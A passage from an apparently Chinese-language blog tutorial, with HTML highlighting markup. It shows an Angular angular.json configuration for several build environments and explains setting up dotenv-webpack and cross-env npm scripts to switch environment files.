                <span class="token string">&quot;input&quot;</span><span class="token operator">:</span> <span class="token string">&quot;node_modules/@ant-design/icons-angular/src/inline-svg/&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;output&quot;</span><span class="token operator">:</span> <span class="token string">&quot;/assets/&quot;</span>
              <span class="token punctuation">}</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;styles&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">/</span><span class="token operator">/</span> 全局样式文件，相当于在index<span class="token punctuation">.</span>html中直接引入
              <span class="token string">&quot;node_modules/videogular2/fonts/videogular.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;node_modules/viewerjs/dist/viewer.min.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;node_modules/ng-zorro-antd/ng-zorro-antd.min.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;src/styles.less&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;scripts&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">/</span><span class="token operator">/</span> 全局脚本文件，相当于在index<span class="token punctuation">.</span>htmlz中直接引入
            <span class="token punctuation">]</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;development&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;optimization&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">/</span> 不开启压缩
              <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span> 开启源码映射
              <span class="token string">&quot;outputHashing&quot;</span><span class="token operator">:</span> <span class="token string">&quot;all&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractCss&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">/</span> 压缩css
              <span class="token string">&quot;namedChunks&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;vendorChunk&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;buildOptimizer&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;budgets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;initial&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;40mb&quot;</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span> js单文件最大
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;50mb&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;anyComponentStyle&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;2000kb&quot;</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span> less单文件最大
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;2000kb&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;fileReplacements&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">/</span><span class="token operator">/</span>  👈  production环境文件替换配置 ，支持替换多个
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.prod.ts&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.prod.ts&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token string">&quot;optimization&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;outputHashing&quot;</span><span class="token operator">:</span> <span class="token string">&quot;all&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractCss&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;namedChunks&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractLicenses&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;vendorChunk&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;buildOptimizer&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;budgets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;initial&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;4mb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;5mb&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;anyComponentStyle&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;6kb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;10kb&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;test&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;fileReplacements&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">/</span><span class="token operator">/</span>  👈  test环境文件替换配置
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.test.ts&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                 <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.test.ts&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token string">&quot;optimization&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;outputHashing&quot;</span><span class="token operator">:</span> <span class="token string">&quot;all&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractCss&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;namedChunks&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractLicenses&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;vendorChunk&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;buildOptimizer&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;budgets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;initial&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;4mb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;5mb&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;anyComponentStyle&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;6kb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;10kb&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;intranet&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span> 
              <span class="token string">&quot;fileReplacements&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token operator">/</span><span class="token operator">/</span>  👈  intranet环境文件替换配置
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.intranet.ts&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.ts&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/online-school-config/online-school-config.intranet.ts&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token string">&quot;optimization&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;outputHashing&quot;</span><span class="token operator">:</span> <span class="token string">&quot;all&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractCss&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;namedChunks&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;extractLicenses&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;vendorChunk&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
              <span class="token string">&quot;buildOptimizer&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token string">&quot;budgets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;initial&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;4mb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;5mb&quot;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                  <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;anyComponentStyle&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;6kb&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;10kb&quot;</span>
                <span class="token punctuation">}</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;serve&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>   <span class="token operator">/</span><span class="token operator">/</span>  👈  开发环境默认使用environment<span class="token punctuation">.</span>ts
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-builders/custom-webpack:dev-server&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:build&quot;</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:build:production&quot;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;extract-i18n&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:extract-i18n&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:build&quot;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;test&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:karma&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;main&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/test.ts&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;polyfills&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/polyfills.ts&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;tsConfig&quot;</span><span class="token operator">:</span> <span class="token string">&quot;tsconfig.spec.json&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;karmaConfig&quot;</span><span class="token operator">:</span> <span class="token string">&quot;karma.conf.js&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;stylePreprocessorOptions&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;includePaths&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token string">&quot;./src/style/&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;node_modules/&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;./core/less/&quot;</span>
              <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&quot;assets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token string">&quot;src/favicon.ico&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;src/assets/images&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;styles&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token string">&quot;node_modules/videogular2/fonts/videogular.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;node_modules/viewerjs/dist/viewer.min.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;node_modules/ng-zorro-antd/ng-zorro-antd.min.css&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;src/styles.less&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;scripts&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">]</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;lint&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:tslint&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;tsConfig&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token string">&quot;tsconfig.app.json&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;tsconfig.spec.json&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;e2e/tsconfig.json&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;exclude&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token string">&quot;**/node_modules/**&quot;</span>
            <span class="token punctuation">]</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;e2e&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:protractor&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;protractorConfig&quot;</span><span class="token operator">:</span> <span class="token string">&quot;e2e/protractor.conf.js&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;devServerTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:serve&quot;</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;devServerTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:serve:production&quot;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">&quot;defaultProject&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 默认启动项目</span>
  <span class="token string">&quot;cli&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;analytics&quot;</span><span class="token operator">:</span> <span class="token string">&quot;74566f8d-1c6f-48f9-9307-eb998d2f74d1&quot;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br><span class="line-number">248</span><br><span class="line-number">249</span><br><span class="line-number">250</span><br><span class="line-number">251</span><br></div></div><p>这样不方便我们在开发环境区分不同的环境，同时做不到根据不同的npm script传参去让项目在本地运行进入不同的环境去模拟各种生产环境，同时可以在多项目管理中根据环境的不同区分引入模块。我们可以使用<a href="https://www.npmjs.com/package/dotenv-webpack" target="_blank" rel="noopener noreferrer"><code>dotenv-webpack</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>实现在组件中使用process.env，同时接受npm script传入的变量。形式类似vue中的.env</p> <ol><li>安装</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm install dotenv<span class="token operator">-</span>webpack <span class="token operator">--</span>save<span class="token operator">-</span>dev
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>项目中新建各种环境的.env</li></ol> <p><img src="/vuebloger/img/post/Snipaste_2021-04-12_17-26-53.png" alt=""></p> <ol start="3"><li>配置package.json和webpack.config.js</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// package.json</span>
<span class="token string">&quot;start&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ng serve --port 8991 --host 0.0.0.0&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;start:test&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=test npm run start&quot;</span><span class="token punctuation">,</span><span class="token comment">// 👈通过cross-env NODE_ENV注入变量在node运行时即webpack.config.js中区分应用不同的.env文件</span>
<span class="token string">&quot;start:production&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=production npm run start&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 这里注意不一定NODE_ENV,可以为其他比如aa</span>
<span class="token string">&quot;start:intranet&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=intranet npm run start&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;build&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ng build --prod --aot --configuration=development&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;build:development&quot;</span><span class="token operator">:</span> <span class="token string">&quot;npm run build&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;build:test&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=test npm run build -- --configuration=test&quot;</span><span class="token punctuation">,</span>
